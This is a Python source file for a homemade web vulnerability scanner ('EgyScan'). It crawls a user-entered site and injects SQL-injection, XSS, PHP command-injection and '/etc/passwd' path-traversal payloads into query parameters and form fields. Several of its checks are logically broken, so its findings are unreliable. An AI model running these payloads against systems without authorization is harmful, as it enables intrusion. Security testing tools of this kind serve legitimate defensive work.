import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
from itertools import islice
from urllib.robotparser import RobotFileParser
from ratelimit import limits, sleep_and_retry
import time
import logging
import tqdm

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(levelname)s - %(message)s")

# ASCII art glowing logo
logo = r"""
   ____                   _               __        ______            _             
  / __ \____  _____ ____ ( )_____ ___    / /__     / ____/___  ____ _(_)___  ___   
 / /_/ / __ \/ ___/ ___)|// ___// _ \  / //_/____/ / __/ __ \/ __ `/ / __ \/ _ \  
/ _, _/ /_/ (__  |__  ) / (__  )  __/ / ,<  /____/ /_/ / /_/ / /_/ / / / / /  __/  
\___\_\____/____/____/  \___/ \___//_/|_|       \____/\____/\__, /_/_/ /_/\___/   
                                                           /____/                 
"""

# Print the glowing logo
def print_logo():
    glow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    interval = 0.5  # Time interval between color changes (in seconds)

    for color in glow_colors:
        print(color + logo)
        time.sleep(interval)


# Constants
MAX_WORKERS = 20
REQUESTS_PER_SECOND = 1

payloads = ["'", "\"", "<script>alert('XSS')</script>", "<?php system('id'); ?>", "../../../../etc/passwd"]

# Common Vulnerability Checks
def check_sqli(url):
    response = requests.get(url)
    if response.status_code == 200 and ("error in SQL syntax" in response.text or "mysql_fetch_array" in response.text or "/var/www" in response.text):
        return True
    return False


def check_rce(url):
    response = requests.get(url)
    if response.status_code == 200 and "root:" in response.text:
        return True
    return False


def check_xss(url):
    response = requests.get(url)
    if response.status_code == 200 and "XSS" in response.text:
        return True
    return False


def check_lfi(url):
    response = requests.get(url)
    if response.status_code == 200 and "root:" in response.text:
        return True
    return False


def check_open_redirect(url):
    payload = "http://www.google.com"
    response = requests.get(url + payload)
    if response.status_code == 200 and "google.com" in response.url:
        return True
    return False


def check_backup_files(url):
    extensions = [".bak", ".zip", ".tgz"]
    for extension in extensions:
        response = requests.get(url + extension)
        if response.status_code == 200:
            return True
    return False


def check_database_exposure(url):
    endpoints = ["phpmyadmin", "adminer", "dbadmin"]
    for endpoint in endpoints:
        response = requests.get(url + "/" + endpoint)
        if response.status_code == 200:
            return True
    return False


def check_directory_listings(url):
    response = requests.get(url)
    if response.status_code == 200 and "Index of" in response.text:
        return True
    return False


def check_sensitive_information(url):
    keywords = ["private_key", "credit_card", "api_key", "secret_key"]
    response = requests.get(url)
    for keyword in keywords:
        if keyword in response.text:
            return True
    return False


# Common session object for making requests
session = requests.Session()


# Rate limiting decorator
@sleep_and_retry
@limits(calls=REQUESTS_PER_SECOND, period=1)
def rate_limited_request(url):
    return session.get(url)


# Parse robots.txt for a given URL
def parse_robots_txt(url):
    parsed_url = urlparse(url)
    robots_txt_url = parsed_url.scheme + "://" + parsed_url.netloc + "/robots.txt"
    response = rate_limited_request(robots_txt_url)
    parser = RobotFileParser()
    parser.parse(response.text.splitlines())
    return parser


# Common function to extract URLs from HTML
def extract_urls_from_html(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    urls = set()
    for anchor in soup.find_all("a"):
        href = anchor.get("href")
        if href:
            href = urljoin(base_url, href)
            urls.add(href)
    return urls


# Collect URLs recursively from the target website and its sub-pages
def collect_urls(target_url):
    parsed_url = urlparse(target_url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc
    urls = set()
    processed_urls = set()
    robots_parser = parse_robots_txt(target_url)

    urls.add(target_url)

    with tqdm.tqdm(total=len(urls), desc="Collecting URLs", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
        while urls:
            current_url = urls.pop()
            processed_urls.add(current_url)

            try:
                response = rate_limited_request(current_url)
                if response.status_code == 200:
                    extracted_urls = extract_urls_from_html(response.text, base_url)
                    filtered_urls = filter_urls(extracted_urls, parsed_url.netloc, processed_urls)
                    urls.update(filtered_urls)
            except requests.exceptions.RequestException:
                continue

            # Respect robots.txt rules
            if not robots_parser.can_fetch("*", current_url):
                urls.discard(current_url)

            pbar.update(1)

    return processed_urls


def filter_urls(urls, target_domain, processed_urls):
    filtered_urls = set()
    for url in urls:
        parsed_url = urlparse(url)
        if parsed_url.netloc == target_domain and url not in processed_urls:
            filtered_urls.add(url)
    return filtered_urls


# Inject payloads into parameters, query, and form inputs
def inject_payloads(url):
    parsed_url = urlparse(url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc
    params = parse_qs(parsed_url.query)

    # Inject payloads into parameters
    for param in params:
        for payload in payloads:
            injected_params = params.copy()
            injected_params[param] = [param_value + payload for param_value in injected_params[param]]
            injected_url = url.split("?")[0] + "?" + "&".join(f"{key}={value}" for key, value in injected_params.items())
            scan_url(injected_url)

    # Inject payloads into form inputs
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    for form in forms:
        action = form.get("action")
        if action:
            if not action.startswith("http"):
                action = urljoin(base_url, action)
            form_inputs = form.find_all("input")
            for input_tag in form_inputs:
                name = input_tag.get("name")
                if name:
                    for payload in payloads:
                        injected_data = {name: str(input_tag.get("value", "")) + payload}

                        response = requests.post(action, data=injected_data)
                        scan_url(response.url)


# Scan a single URL for vulnerabilities
def scan_url(url):
    if check_sqli(url):
        logging.warning(f"SQL Injection vulnerability found: {url}")
    if check_rce(url):
        logging.warning(f"Remote Code Execution vulnerability found: {url}")
    if check_xss(url):
        logging.warning(f"Cross-Site Scripting vulnerability found: {url}")
    if check_lfi(url):
        logging.warning(f"Local File Inclusion vulnerability found: {url}")
    if check_open_redirect(url):
        logging.warning(f"Open Redirect vulnerability found: {url}")
    if check_backup_files(url):
        logging.warning(f"Backup File vulnerability found: {url}")
    if check_database_exposure(url):
        logging.warning(f"Database Exposure vulnerability found: {url}")
    if check_directory_listings(url):
        logging.warning(f"Directory Listing vulnerability found: {url}")
    if check_sensitive_information(url):
        logging.warning(f"Sensitive Information Exposure vulnerability found: {url}")


def main():
    print_logo()
    ("EgyScan V1.0")
    target_url = input("Enter the target URL: ")
    print(f"\nScanning: {target_url}\n")

    # Collect URLs
    logging.info("Collecting URLs...")
    urls = collect_urls(target_url)
    logging.info(f"{len(urls)} URLs collected.")

    # Inject payloads and scan URLs
    logging.info("Scanning URLs...")
    for url in urls:
        inject_payloads(url)

    logging.info("Scanning complete.")


if __name__ == "__main__":
    main()
